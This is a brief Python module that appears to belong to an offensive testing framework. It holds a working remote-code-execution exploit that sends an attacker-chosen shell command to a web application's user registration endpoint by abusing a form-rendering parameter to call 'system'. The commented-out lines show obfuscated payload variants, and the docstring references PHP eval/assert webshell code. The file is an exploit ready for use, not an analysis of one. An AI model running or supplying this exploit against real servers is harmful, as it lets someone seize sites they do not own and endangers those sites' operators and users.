#!/usr/bin/env python

from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback

def vulnerable_attack(target,target_port,cmd):
        
    '''
    this is the payload script for vuln:

    eval($_POST[333]);
    assert($_POST[333]);
    '''
    
    try:           
        #cmd = base64.b64encode(cmd)
        # This payload may not work under some php versions
        #payload = "('sy'.'stem')(('bas'.'e64_'.'decode')('%s'))==0"%cmd
        #print payload
        #payload = "call_user_func('sy'.'stem',call_user_func('bas'.'e64_dec'.'ode','%s'));"%cmd
        payload  = cmd
        data = 'form_id=user_register_form&mail[0][#lazy_builder][0]=system&mail[#type]=markup&mail[0][#lazy_builder][1][0]=%s'% quote(payload) 
        res = http("post",target,target_port,"/user/register?element_parents=account/mail/%23value&ajax_form=1",data,headers)
    except Exception,e:
        debug_print(traceback.format_exc())     
        dump_error("attack failed",target,"vulnerable attack")
        res = "error"

    return res




